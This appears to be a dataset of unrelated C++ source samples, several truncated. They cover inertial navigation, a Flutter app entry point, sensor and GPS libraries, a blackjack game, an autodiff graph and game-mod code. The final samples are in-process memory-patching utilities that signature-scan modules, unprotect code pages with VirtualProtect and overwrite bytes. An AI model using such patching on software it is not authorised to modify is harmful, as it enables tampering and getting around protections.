Earth::meridianPrimeVerticalRadius(midpos[0]);\n    wie_n << WGS84_WIE * cos(midpos[0]), 0, -WGS84_WIE * sin(midpos[0]);\n    wen_n << midvel[1] / (rmrn[1] + midpos[2]), -midvel[0] / (rmrn[0] + midpos[2]),\n        -midvel[1] * tan(midpos[0]) / (rmrn[1] + midpos[2]);\n\n    // \u91cd\u65b0\u8ba1\u7b97n\u7cfb\u4e0b\u5e73\u5747\u6bd4\u529b\u79ef\u5206\u9879\n    // recompute d_vfn\n    temp3 = (wie_n + wen_n) * imucur.dt / 2;\n    cnn   = I33 - Rotation::skewSymmetric(temp3);\n    d_vfn = cnn * pvapre.att.cbn * d_vfb;\n\n    // \u91cd\u65b0\u8ba1\u7b97\u91cd\u529b\u3001\u54e5\u5f0f\u79ef\u5206\u9879\n    // recompute d_vgn\n    gl << 0, 0, Earth::gravity(midpos);\n    d_vgn = (gl - (2 * wie_n + wen_n).cross(midvel)) * imucur.dt;\n\n    // \u901f\u5ea6\u66f4\u65b0\u5b8c\u6210\n    // velocity update finish\n    pvacur.vel = pvapre.vel + d_vfn + d_vgn;\n}\n\nvoid INSMech::posUpdate(const PVA &pvapre, PVA &pvacur, const IMU &imupre, const IMU &imucur) {\n\n    Eigen::Vector3d temp1, temp2, midvel, midpos;\n    Eigen::Quaterniond qne, qee, qnn;\n\n    // \u91cd\u65b0\u8ba1\u7b97\u4e2d\u95f4\u65f6\u523b\u7684\u901f\u5ea6\u548c\u4f4d\u7f6e\n    // recompute velocity and position at k-1/2\n    midvel = (pvacur.vel + pvapre.vel) / 2;\n    midpos = pvapre.pos + Earth::DRi(pvapre.pos) * midvel * imucur.dt / 2;\n\n    // \u91cd\u65b0\u8ba1\u7b97\u4e2d\u95f4\u65f6\u523b\u5730\u7406\u53c2\u6570\n    // recompute rmrn, wie_n, wen_n at k-1/2\n    Eigen::Vector2d rmrn;\n    Eigen::Vector3d wie_n, wen_n;\n    rmrn = Earth::meridianPrimeVerticalRadius(midpos[0]);\n    wie_n << WGS84_WIE * cos(midpos[0]), 0, -WGS84_WIE * sin(midpos[0]);\n    wen_n << midvel[1] / (rmrn[1] + midpos[2]), -midvel[0] / (rmrn[0] + midpos[2]),\n     ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"notes_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*!\n *  @file DHT_U.cpp\n *\n *  Temperature & Humidity Unified Sensor Library\n *\n *  This is a library for DHT series of low cost temperature/humidity sensors.\n *\n *  You must have Adafruit Unified Sensor Library library installed to use this\n * class.\n *\n *  Adafruit invests time and resources providing this open source code,\n *  please support Adafruit andopen-source hardware by purchasing products\n *  from Adafruit!\n */\n#include \"DHT_U.h\"\n\n/*!\n *  @brief  Instantiates a new DHT_Unified class\n *  @param  pin\n *          pin number that sensor is connected\n *  @param  type\n *          type of sensor\n *  @param  count\n *          number of sensors\n *  @param  tempSensorId\n *          temperature sensor id\n *  @param  humiditySensorId\n *          humidity sensor id\n */\nDHT_Unified::DHT_Unified(uint8_t pin, uint8_t type, uint8_t count,\n                         int32_t tempSensorId, int32_t humiditySensorId)\n    : _dht(pin, type, count), _type(type), _temp(this, tempSensorId),\n      _humidity(this, humiditySensorId) {}\n\n/*!\n *  @brief  Setup sensor (calls begin on It)\n */\nvoid DHT_Unified::begin() { _dht.begin(); }\n\n/*!\n *  @brief  Sets sensor name\n *  @param  sensor\n *          Sensor that will be set\n */\nvoid DHT_Unified::setName(sensor_t *sensor) {\n  switch (_type) {\n  case DHT11:\n    strncpy(sensor->name, \"DHT11\", sizeof(sensor->name) - 1);\n    break;\n  case DHT12:\n    strncpy(sensor->name, \"DHT12\", sizeof(sensor->name) - 1);\n    break;\n  case DHT21:\n    strncpy(sensor->name, \"DHT21\", sizeof(sensor->name) - 1);\n    break;\n  case DHT22:\n    strncpy(sensor->name, \"DHT22\", sizeof(sensor->name) - 1);\n    break;\n  default:\n    // TODO: Perhaps this should be an error?  However main DHT library doesn't\n    // enforce restrictions on the sensor type value.  Pick a generic name for\n    // now.\n    strncpy(sensor->name, \"DHT?\", sizeof(sensor->name) - 1);\n    break;\n  }\n  sensor->name[sizeof(sensor->name) - 1] = 0;\n}\n\n/*!\n *  @brief  Sets Minimum Delay Value\n *  @param  sensor\n *          Sensor that will be set\n */\nvoid DHT_Unified::setMinDelay(sensor_t *sensor) {\n  switch (_type) {\n  case DHT11:\n    sensor->min_delay = 1000000L; // 1 second (in microseconds)\n    break;\n  case DHT12:\n    sensor->min_delay = 2000000L; // 2 second (in microseconds)\n    break;\n  case DHT21:\n    sensor->min_delay = 2000000L; // 2 seconds (in microseconds)\n    break;\n  case DHT22:\n    sensor->min_delay = 2000000L; // 2 seconds (in microseconds)\n    break;\n  default:\n    // Default to slowest sample rate in case of unknown type.\n    sensor->min_delay = 2000000L; // 2 seconds (in microseconds)\n    break;\n  }\n}\n\n/*!\n *  @brief  Instantiates a new DHT_Unified Temperature Class\n *  @param  parent\n *          Parent Sensor\n *  @param  id\n *          Sensor id\n */\nDHT_Unified::Temperature::Temperature(DHT_Unified *parent, int32_t id)\n    : _parent(parent), _id(id) {}\n\n/*!\n *  @brief  Reads the sensor and returns the data as a sensors_event_t\n *  @param  event\n *  @return always returns true\n */\nbool DHT_Unified::Temperature::getEvent(sensors_event_t *event) {\n  // Clear event definition.\n  memset(event, 0, sizeof(sensors_event_t));\n  // Populate sensor reading values.\n  event->version = sizeof(sensors_event_t);\n  event->sensor_id = _id;\n  event->type = SENSOR_TYPE_AMBIENT_TEMPERATURE;\n  event->timestamp = millis();\n  event->temperature = _parent->_dht.readTemperature();\n\n  return true;\n}\n\n/*!\n *  @brief  Provides the sensor_t data for this sensor\n *  @param  sensor\n */\nvoid DHT_Unified::Temperature::getSensor(sensor_t *sensor) {\n  // Clear sensor definition.\n  memset(sensor, 0, sizeof(sensor_t));\n  // Set sensor name.\n  _parent->setName(sensor);\n  // Set version and ID\n  sensor->version = DHT_SENSOR_VERSION;\n  sensor->sensor_id = _id;\n  // Set type and characteristics.\n  sensor->type = SENSOR_TYPE_AMBIENT_TEMPERATURE;\n  _parent->setMinDelay(sensor);\n  switch (_parent->_type) {\n  case DHT11:\n    sensor->max_value = 50.0F;\n    sensor->min_value = 0.0F;\n    sensor->resolution = 2.0F;\n    break;\n  case DHT12:\n    sensor->max_value = 60.0F;\n    sensor->min_value = -20.0F;\n    sensor->resolution = 0.5F;\n    break;\n  case DHT21:\n    sensor->max_value = 80.0F;\n    sensor->min_value = -40.0F;\n    sensor->resolution = 0.1F;\n    break;\n  case DHT22:\n    sensor->max_value = 125.0F;\n    sensor->min_value = -40.0F;\n    sensor->resolution = 0.1F;\n    break;\n  default:\n    // Unknown type, default to 0.\n    sensor->max_value = 0.0F;\n    sensor->min_value = 0.0F;\n    sensor->resolution = 0.0F;\n    break;\n  }\n}\n\n/*!\n *  @brief  Instantiates a new DHT_Unified Humidity Class\n *  @param  parent\n *          Parent Sensor\n *  @param  id\n *          Sensor id\n */\nDHT_Unified::Humidity::Humidity(DHT_Unified *parent, int32_t id)\n    : _parent(parent), _id(id) {}\n\n/*!\n *  @brief  Reads the sensor and returns the data as a sensors_event_t\n *  @param  event\n *  @return always returns true\n */\nbool DHT_Unified::Humidity::getEvent(sensors_event_t *event) {\n  // Clear event d",
    "#include \"helpers.h\"\n#include <chrono>\n#include <cmath>\n#include <ctime>\n#include <random>\n\nstruct Timer {\n   std::chrono::system_clock::time_point time;\n};\n\nTimer timer;\n\nvoid tik() {\n   timer.time = std::chrono::system_clock::now();\n}\n\ndouble tok() {\n   std::chrono::system_clock::time_point time = std::chrono::system_clock::now();\n   std::chrono::duration<double> delta_time = time - timer.time;\n   return delta_time.count();\n}\n\ndouble time_to_years(Time time) {\n   return double(time.y*360 + time.m*30 + time.d)/360.0;\n}\n\nunsigned long now() {\n   std::time_t time = std::time(NULL); // long int\n   return (unsigned long) (time);\n}\n\nstd::default_random_engine generator(now());\n\ndouble gaussian(double m, double sd) {\n   std::normal_distribution<double> distribution(m, sd);\n   return distribution(generator);\n}\n\ndouble doleans_dade(double m, double sd) {\n   double U = gaussian(m, sd);\n   return std::exp(U-std::pow(sd, 2.)/2.);\n}\n\ndouble heaviside(double x) {\n   return x >= 0 ? 1 : 0;\n}\n\ndouble positive_part(double x) {\n   return x > 0 ? x : 0;\n}\n\ndouble compute_sd(double mean, double mean_square) {\n   return mean_square - mean*mean;\n}\n",
    "#include <game.h>\n#include <stage.h>\n\nextern u8 LastLevelPlayed[2];\nextern \"C\" int CanExitThisLevel();\nextern int previewID;\n\nvoid restartLevel() {\n\n\tLastPowerupStoreType = LOSE_LEVEL;\n\n\n\tif(GetActiveRemocon()->heldButtons & WPAD_TWO || GetActiveRemocon()->heldButtons & WPAD_A) {\n\t\tExitStage(WORLD_MAP, 0, LOSE_LEVEL, WIPE_BOWSER);\n\t\treturn;\n\t}\n\n\tif(((!Player_Lives[0]) || \n\t\t((Player_Active[1]) && !Player_Lives[1]) ||\n\t\t((Player_Active[2]) && !Player_Lives[2]) ||\n\t\t((Player_Active[3]) && !Player_Lives[3]))) {\n\t\tExitStage(WORLD_MAP, 0, LOSE_LEVEL, WIPE_BOWSER);\n\t\treturn;\n\t}\n\n\tStartLevelInfo sl;\n\tsl.replayTypeMaybe = 0;\n\tsl.entrance = 0xFF;\n\tsl.areaMaybe = 0;\n\tsl.unk4 = 0;\n\tsl.purpose = 0;\n\n\tsl.world1 = LastLevelPlayed[0];\n\tsl.world2 = LastLevelPlayed[0];\n\tsl.level1 = LastLevelPlayed[1];\n\tsl.level2 = LastLevelPlayed[1];\n\n\tActivateWipe(WIPE_BOWSER);\n\n\tpreviewID = 0;\n\n\t\tif (GameMgrP->eight.checkpointEntranceID == 51) {\n\t\t\tpreviewID = 1;\n\t\t}\n\t\telse if (GameMgrP->eight.checkpointEntranceID == 52) {\n\t\t\tpreviewID = 2;\n\t\t}\n\n\n\tDoStartLevel(GetGameMgr(), &sl);\n}\n\nvoid exitLevel() {\n\tif(CanExitThisLevel()) {\n\t\tExitStage(WORLD_MAP, 0, EXIT_LEVEL, 5);\n\t}\n\telse {\n\t\tint isGameOver = (Player_Lives[0] - 1) + (((Player_Active[1] - 1) == 1) ? (Player_Lives[1] - 1) : 0) + (((Player_Active[2] - 1) == 1) ? (Player_Lives[2] - 1) : 0) + (((Player_Active[3] - 1) == 1) ? (Player_Lives[3] - 1) : 0); //Get if there's a Game Over pending\n\t\tif(isGameOver > 0) {\n\t\t\tPlayer_Lives[0]--;\n\t\t\tif(Player_Active[1]) {\n\t\t\t\tPlayer_Lives[1]--;\n\t\t\t}\n\t\t\tif(Player_Active[2]) {\n\t\t\t\tPlayer_Lives[2]--;\n\t\t\t}\n\t\t\tif(Player_Active[3]) {\n\t\t\t\tPlayer_Lives[3]--;\n\t\t\t}\n\t\t}\n\t\tExitStage(WORLD_MAP, 0, LOSE_LEVEL, WIPE_BOWSER);\n\t}\n}",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <random>\n#include <ctime>\n\n// Kortin rakenne\nstruct Kortti {\n    std::string maa;\n    std::string pelikortti;\n    int arvo;\n};\n\n// Korttipakan luominen\nstd::vector<Kortti> luoPakka() {\n    std::vector<Kortti> pakka;\n    std::string maat[] = {\"Hearts\", \"Diamonds\", \"Clubs\", \"Spades\"};\n    std::string pelikortit[] = {\"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"Jack\", \"Queen\", \"King\", \"Ace\"};\n    int arvot[] = {2, 3, 4, 5, 6, 7, 8, 9, 10, 10, 10, 10, 11};\n\n    for (const auto & maa : maat) {\n        for (int i = 0; i < 13; ++i) {\n            pakka.push_back({maa, pelikortit[i], arvot[i]});\n        }\n    }\n    return pakka;\n}\n\n// Korttipakan sekoittaminen\nvoid sekoitaPakka(std::vector<Kortti> & pakka) {\n    std::random_device rd;\n    std::mt19937 g(rd());\n    std::shuffle(pakka.begin(), pakka.end(), g);\n}\n\n// Korttien tulostaminen\nvoid printKortti(const Kortti & Kortti) {\n    std::cout << Kortti.pelikortti << \" of \" << Kortti.maa << \" (\" << Kortti.arvo << \")\\n\";\n}\n\n// K\u00e4den arvon laskeminen\nint laskeKadenArvo(const std::vector<Kortti> & hand) {\n    int arvo = 0;\n    int AssanLuku = 0;\n    for (const auto& Kortti : hand) {\n        arvo += Kortti.arvo;\n        if (Kortti.pelikortti == \"Ace\") {\n            ++AssanLuku;\n        }\n    }\n    while (arvo > 21 && AssanLuku > 0) {\n        arvo -= 10;\n        --AssanLuku;\n    }\n    return arvo;\n}\n\n// Pelaajan vuoro\nbool pelaajanVuoro(std::vector<Kortti>& pakka, std::vector<Kortti>& pelaajanKasi) {\n    while (true) {\n        std::cout << \"\\n\";\n        std::cout << \"Your hand:\\n\";\n        for (const auto& Kortti : pelaajanKasi) {\n            printKortti(Kortti);\n        }\n        int kadenArvo = laskeKadenArvo(pelaajanKasi);\n        std::cout << \"\\n\";\n        std::cout << \"Hand value: \" << kadenArvo << \"\\n\";\n        if (kadenArvo > 21) {\n            std::cout << \"Bust! You lose.\\n\";\n            return false;\n        }\n\n        std::cout << \"\\n\";\n        std::cout << \"Do you want to hit (h) or stand (s)? \";\n        char choice;\n        std::cin >> choice;\n        if (choice == 's') {\n            break;\n        } else if (choice == 'h') {\n            pelaajanKasi.push_back(pakka.back());\n            pakka.pop_back();\n        }\n    }\n    return true;\n}\n\n// Jakajan vuoro\nbool jakajanVuoro(std::vector<Kortti>& pakka, std::vector<Kortti>& jakajanKasi) {\n    while (laskeKadenArvo(jakajanKasi) < 17) {\n        jakajanKasi.push_back(pakka.back());\n        pakka.pop_back();\n    }\n    int kadenArvo = laskeKadenArvo(jakajanKasi);\n    std::cout << \"Dealer's hand:\\n\";\n    for (const auto& Kortti : jakajanKasi) {\n        printKortti(Kortti);\n    }\n    std::cout << \"Hand value: \" << kadenArvo << \"\\n\";\n    return kadenArvo <= 21;\n}\n\n// BlackJack-pelin p\u00e4\u00e4funktio\nint main() {\n    char playAgain;\n    do {\n        std::vector<Kortti> pakka = luoPakka();\n        sekoitaPakka(pakka);\n\n        std::vector<Kortti> pelaajanKasi = {pakka.back()};\n        pakka.pop_back();\n        pelaajanKasi.push_back(pakka.back());\n        pakka.pop_back();\n\n        std::vector<Kortti> jakajanKasi = {pakka.back()};\n        pakka.pop_back();\n        jakajanKasi.push_back(pakka.back());\n        pakka.pop_back();\n\n        if (!pelaajanVuoro(pakka, pelaajanKasi)) {\n            std::cout << \"\\n\";\n            std::cout << \"Do you want to play again (y/n)? \";\n            std::cin >> playAgain;\n            continue;\n        }\n\n        if (!jakajanVuoro(pakka, jakajanKasi)) {\n            std::cout << \"Dealer busts! You win!\\n\";\n            std::cout << \"\\n\";\n            std::cout << \"Do you want to play again (y/n)? \";\n            std::cin >> playAgain;\n            continue;\n        }\n\n        int pelaajanArvo = laskeKadenArvo(pelaajanKasi);\n        int jakajanArvo = laskeKadenArvo(jakajanKasi);\n\n        if (pelaajanArvo > jakajanArvo) {\n            std::cout << \"\\n\";\n            std::cout << \"You win!\\n\";\n            std::cout << \"\\n\";\n        } else if (pelaajanArvo < jakajanArvo) {\n            std::cout << \"\\n\";\n            std::cout << \"You lose.\\n\";\n            std::cout << \"\\n\";\n        } else {\n            std::cout << \"\\n\";\n            std::cout << \"It's a tie!\\n\";\n            std::cout << \"\\n\";\n        }\n\n        std::cout << \"\\n\";\n        std::cout << \"Do you want to play again (y/n)? \";\n        std::cout << \"\\n\";\n        std::cin >> playAgain;\n    } while (playAgain == 'y');\n\n    return 0;\n}\n",
    "#include <cmath>\n#include <iostream>\n#include <vector>\n\nnamespace autodiff {\n\nclass Differentiable {\npublic:\n  Differentiable() = default;\n  virtual ~Differentiable() = default;\n  virtual void backward() {}\n\n  void setup_gradients(size_t total_count) { grads.resize(total_count, 0); }\n  void accumulate_gradient(size_t i, float grad) { grads[i] += grad; }\n  void clear_grad() {\n    for (auto &grad : grads) {\n      grad = 0;\n    }\n  }\n  std::vector<float> grads;\n};\n\n}  // namespace autodiff\n\n#define CG_NODE_SUPERBASE \\\npublic                    \\\n  autodiff::Differentiable\n#define CG_NODE_EXTENSION                                                   \\\n  void backprop(std::vector<float> const &grad) {                           \\\n    for (size_t i = 0; i < grad.size(); ++i) {                              \\\n      auto from_sock = inputs_[i].from();                                   \\\n      if (from_sock) {                                                      \\\n        from_sock->node().accumulate_gradient(from_sock->index(), grad[i]); \\\n      }                                                                     \\\n    }                                                                       \\\n  }\n\n#include \"compute_graph/compute_graph.hpp\"\n\nusing namespace compute_graph;\n\n#define DECLARE_UNARY_OP(name, op, diff_op)              \\\n  class name : public NodeDerive<name> {                 \\\n  public:                                                \\\n    CG_NODE_COMMON(name, #name, \"Unary operation \" #op); \\\n    CG_NODE_INPUTS((float, x, \"The first operand\"));     \\\n    CG_NODE_OUTPUTS((float, y, \"The result of \" #op));   \\\n    void on_construct() { setup_gradients(1); }          \\\n    void operator()(Context &) final {                   \\\n      clear_grad();                                      \\\n      set(out::y, op(*get(in::x)));                      \\\n    }                                                    \\\n    void backward() final {                              \\\n      float grad_x = diff_op(*get(out::y)) * grads[0];   \\\n      backprop({grad_x});                                \\\n    }                                                    \\\n  }\n\nDECLARE_UNARY_OP(Sin, std::sin, std::cos);\n\n#define DECLARE_BINARY_OP(name, op)                                                          \\\n  class name : public NodeDerive<name> {                                                     \\\n  public:                                                                                    \\\n    CG_NODE_COMMON(name, #name, \"Binary operation \" #op);                                    \\\n    CG_NODE_INPUTS((float, a, \"The first operand\", 0), (float, b, \"The second operand\", 0)); \\\n    CG_NODE_OUTPUTS((float, result, \"The result of \" #op));                                  \\\n    void operator()(Context &) final { set(out::result, get_or(in::a) op get_or(in::b)); }   \\\n  }\n\nclass Add : public NodeDerive<Add> {\npublic:\n  CG_NODE_COMMON(Add, \"Add\", \"Binary operation +\");\n  CG_NODE_INPUTS((float, a, \"The first operand\"), (float, b, \"The second operand\"));\n  CG_NODE_OUTPUTS((float, result, \"The result of +\"));\n  void on_construct() { setup_gradients(2); }\n  void operator()(Context &) final {\n    clear_grad();\n    set(out::result, *get(in::a) + *get(in::b));\n  }\n  void backward() final { backprop({grads[0], grads[0]}); }\n};\n\nclass Mul : public NodeDerive<Mul> {\npublic:\n  CG_NODE_COMMON(Mul, \"Mul\", \"Binary operation *\");\n  CG_NODE_INPUTS((float, a, \"The first operand\"), (float, b, \"The second operand\"));\n  CG_NODE_OUTPUTS((float, result, \"The result of *\"));\n  void on_construct() { setup_gradients(2); }\n  void operator()(Context &) final {\n    clear_grad();\n    set(out::result, *get(in::a) * *get(in::b));\n  }\n  void backward() final {\n    float grad_a = *get(in::b) * grads[0];\n    float grad_b = *get(in::a) * grads[0];\n    backprop({grad_a, grad_b});\n  }\n};\n\nclass ConstantFloat : public NodeDerive<ConstantFloat> {\npublic:\n  CG_NODE_COMMON(ConstantFloat, \"ConstantFloat\", \"Generate a constant float\");\n  CG_NODE_INPUTS();\n\n  CG_NODE_OUTPUTS((float, value, \"A constant float.\"));\n\n  void on_construct() { setup_gradients(1); }\n\n  void operator()(Context &) final { set(out::value, value_); }\n\n  float value_ = 4;\n};\n\ntemplate <typename T> auto create() { return NodeRegistry::instance().create<T>(); }\nint main() {\n  Graph g;\n  auto sin = g.add(create<Sin>());\n  auto add_ab = g.add(create<Add>());\n  auto mul_ab_c = g.add(create<Mul>());\n  auto a = g.add(create<ConstantFloat>()),\n       b = g.add(create<ConstantFloat>()),\n       c = g.add(create<ConstantFloat>());\n\n  // Sin [(a + b) * c]\n  a->value_ = 1;\n  b->value_ = 2;\n  c->value_ = 3.14159265358979323846 / 4;\n\n  g.connect(a.output(0), add_ab.input(0));\n  g.connect(b.output(ConstantFloat::out::value), add_ab.input(Add::in::b));\n  g.connect(add_ab.output(Add::out::result), mul_ab_c.input(\"a\").value());\n  g.connect(c.output(\"value\").value(), mul_ab_c.input(1));\n  g.connect(mul_ab_c.output(\"result\").value(), sin.inp",
    "/***************************************************************************\n SimpleGPS_Library\n Author      : ANAS ALSAYAR\n Date        : Jul 31 - 2024\n****************************************************************************/\n\n\n#include \"SimpleGPS.h\"\n\nSimpleGPS::SimpleGPS(int rxPin, int txPin, uint32_t baudRate)\n  : _rxPin(rxPin), _txPin(txPin), _baudRate(baudRate), _ss(rxPin, txPin) {}\n\nvoid SimpleGPS::begin() {\n  Serial.begin(9600); // serial1\n  _ss.begin(_baudRate);\n  if (_ss.available())\n    _onceki = _ss.read();\n}\n\nvoid SimpleGPS::update() {\n  if (_ss.available()) { // serial1\n    _simdiki = _ss.read();\n    if (_depola == 0) {\n      if (_onceki == 71 && _simdiki == 65) {\n        _counter = 37;\n        _depola = 1;\n      } else {\n        _onceki = _simdiki;\n      }\n    } else {\n      _depo[37 - _counter] = _simdiki;\n      _counter--;\n      if (_counter == 0) {\n        _depola = 0;\n        parseGPSData();\n      }\n    }\n  }\n}\n\nvoid SimpleGPS::parseGPSData() {\n  _saat = 10 * (_depo[1] - 48) + _depo[2] - 48 + 3;\n  _dakika = 10 * (_depo[3] - 48) + _depo[4] - 48;\n  _saniye = 10 * (_depo[5] - 48) + _depo[6] - 48;\n\n  _enlem = float((10 * (_depo[11] - 48) + _depo[12] - 48) * 6000000 +\n                (_depo[13] - 48) * 1000000 + (_depo[14] - 48) * 100000 +\n                (_depo[16] - 48) * 10000 + (_depo[17] - 48) * 1000 +\n                (_depo[18] - 48) * 100 + (_depo[19] - 48) * 10 +\n                _depo[20] - 48);\n  _enlemrad = _enlem * 3.1415 / 1080000000.0;\n  _enlemcm = _enlem * 1.852;\n  _boylamcm = float((100 * (_depo[24] - 48) + 10 * (_depo[25] - 48) +\n                    _depo[26] - 48) * 600000\n",
    "#include \"memory.h\"\n#include <TlHelp32.h>\n#include <regex>\n#include <Psapi.h>\n#define INRANGE(x,a,b)  (x >= a && x <= b) \n#define getBits( x )    (INRANGE((x&(~0x20)),'A','F') ? ((x&(~0x20)) - 'A' + 0xa) : (INRANGE(x,'0','9') ? x - '0' : 0))\n#define getByte( x )    (getBits(x[0]) << 4 | getBits(x[1]))\n\nnamespace mem\n{\n\tuint64_t FindPattern(uint64_t rangeStart, uint64_t rangeEnd, const char* pattern)\n\t{\n\t\tconst char* pat = pattern;\n\t\tuint64_t firstMatch = 0;\n\t\tfor (uint64_t pCur = rangeStart; pCur < rangeEnd; pCur++)\n\t\t{\n\t\t\tif (!*pat) return firstMatch;\n\t\t\tif (*(PBYTE)pat == '\\?' || *(BYTE*)pCur == getByte(pat)) {\n\t\t\t\tif (!firstMatch)\n\t\t\t\t{\n\t\t\t\t\tfirstMatch = pCur;\n\t\t\t\t}\n\t\t\t\tif (!pat[2]) return firstMatch;\n\t\t\t\tif (*(PWORD)pat == '\\?\\?' || *(PBYTE)pat != '\\?') pat += 3;\n\t\t\t\telse pat += 2;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tpat = pattern;\n\t\t\t\tif (firstMatch != 0)\n\t\t\t\t\tpCur = firstMatch + 1;\n\t\t\t\tfirstMatch = 0;\n\t\t\t}\n\t\t}\n\t\tif (firstMatch != 0)\n\t\t\treturn firstMatch;\n\t\telse\n\t\t\treturn NULL;\n\t}\n\n\tuint64_t find_pattern(HMODULE module, const char* pattern)\n\t{\n\t\tMODULEINFO mInf;\n\t\tGetModuleInformation(GetCurrentProcess(), module, &mInf, sizeof(mInf));\n\t\treturn FindPattern((uint64_t)mInf.lpBaseOfDll, (uint64_t)((uint64_t)mInf.lpBaseOfDll + mInf.SizeOfImage), pattern);\n\t}\n\n\n\tHMODULE find_module(std::string regex_str)\n\t{\n\t\tHANDLE hModuleSnap = INVALID_HANDLE_VALUE;\n\t\tMODULEENTRY32 me32;\n\t\thModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetProcessId(NULL));\n\t\tif (hModuleSnap == INVALID_HANDLE_VALUE)\n\t\t\treturn nullptr;\n\t\tme32.dwSize = sizeof(MODULEENTRY32);\n\t\tif (!Module32First(hModuleSnap, &me32))\n\t\t{\n\t\t\tCloseHandle(hModuleSnap);\n\t\t\treturn nullptr;\n\t\t}\n\t\twhile (Module32Next(hModuleSnap, &me32))\n\t\t{\n\t\t\tstd::wstring mn = me32.szModule;\n\t\t\tstd::string name;\n\t\t\tstd::transform(mn.begin(), mn.end(), std::back_inserter(name), [](wchar_t c) {\n\t\t\t\treturn (char)c;\n\t\t\t\t});\n\n\t\t\tstd::regex re(regex_str, std::regex_constants::icase);\n\t\t\tstd::smatch match;\n\t\t\tif (std::regex_search(name, match, re))\n\t\t\t\treturn me32.hModule;\n\t\t}\n\t\tCloseHandle(hModuleSnap);\n\n\t\treturn nullptr;\n\t}\n\tstd::unordered_map<PVOID, mem_protect> protections;\n\tint instruction_to_absolute_address(int instruction_address) //assumes 32 bit\n\t{\n\t\tint end_of_instruction = instruction_address + 0x5;\n\t\tunprotect_memory((PVOID)instruction_address, 5);\n\t\tBYTE instruction = *(BYTE*)instruction_address;\n\t\tint r = 0;\n\t\tif (instruction == 0xE8 || instruction == 0xE9)\n\t\t\tr = (*(int*)(instruction_address + 0x1)) + end_of_instruction;\n\t\telse if (instruction == 0xFF)\n\t\t{\n\t\t\tr = (*(int*)(instruction_address + 0x2));\n\t\t\tr = *(int*)r;\n\t\t}\n\t\treset_memory_protection((PVOID)instruction_address);\n\t\treturn r;\n\t}\n\tvoid unprotect_memory(PVOID target, size_t size)\n\t{\n\t\tprotections[target].size = size;\n\t\tVirtualProtect((PVOID*)target, size, PAGE_EXECUTE_READWRITE, &protections[target].orig);\n\n\t}\n\tvoid reset_memory_protection(PVOID target)\n\t{\n\t\tif (protections[target].size)\n\t\t\tVirtualProtect((PVOID*)target, protections[target].size, protections[target].orig, nullptr);\n\t}\n\tvoid set(int target, int val, int size, BYTE* buffer)\n\t{\n\t\tDWORD oldprotect;\n\t\tVirtualProtect((PVOID*)target, size, PAGE_EXECUTE_READWRITE, &oldprotect);\n\t\tif (buffer)\n\t\t\tmemcpy(buffer, (void*)target, size);\n\t\tmemset((void*)target, val, size);\n\t\tVirtualProtect((PVOID*)target, size, oldprotect, &oldprotect);\n\t}\n\tvoid copy(int target, int source, int size, BYTE* buffer)\n\t{\n\t\tDWORD oldprotect;\n\t\tVirtualProtect((PVOID*)target, size, PAGE_EXECUTE_READWRITE, &oldprotect);\n\t\tif (buffer)\n\t\t\tmemcpy((void*)buffer, (const void*)target, size);\n\t\tmemcpy((void*)target, (const void*)source, size);\n\t\tVirtualProtect((PVOID*)target, size, oldprotect, &oldprotect);\n\t}\n\tvoid copy(int target, BYTE* source, int size, BYTE* buffer)\n\t{\n\t\tDWORD oldprotect;\n\t\tVirtualProtect((PVOID*)target, size, PAGE_EXECUTE_READWRITE, &oldprotect);\n\t\tif (buffer)\n\t\t\tmemcpy((void*)buffer, (const void*)target, size);\n\t\tmemcpy((void*)target, (const void*)source, size);\n\t\tVirtualProtect((PVOID*)target, size, oldprotect, &oldprotect);\n\t}\n\tvoid get(int target, int size, BYTE* buffer)\n\t{\n\t\tif (!buffer)\n\t\t\treturn;\n\t\tDWORD oldprotect;\n\t\tVirtualProtect((PVOID*)target, size, PAGE_EXECUTE_READWRITE, &oldprotect);\n\t\tmemcpy((void*)buffer, (const void*)target, size);\n\t\tVirtualProtect((PVOID*)target, size, oldprotect, &oldprotect);\n\t}\n}",
    "#include \"sigscan.h\"\n\n#include <Windows.h>\n#include <Psapi.h>\n#pragma comment(lib, \"Psapi.lib\")\n\nnamespace sigscan\n{\n\tbool compare(const char *location, const char *aob, const char *mask)\n\t{\n\t\tfor (; *mask; ++aob, ++mask, ++location)\n\t\t{\n\t\t\tif (*mask == 'x' && *location != *aob)\n\t\t\t{\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\n\t\treturn true;\n\t}\n\n\tbool compare_reverse(const char *location, const char *aob, const char *mask)\n\t{\n\t\tconst char* mask_iter = mask + strlen(mask) - 1;\n\t\tfor (; mask_iter >= mask; --aob, --mask_iter, --location)\n\t\t{\n\t\t\tif (*mask_iter == 'x' && *location != *aob)\n\t\t\t{\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\n\t\treturn true;\n\t}\n\n\tuint8_t *scan(const char *aob, const char *mask, uintptr_t start, uintptr_t end)\n\t{\n\t\tif (start <= end)\n\t\t{\n\t\t\tfor (; start < end - strlen(mask); ++start)\n\t\t\t{\n\t\t\t\tif (compare((char *)start, (char *)aob, 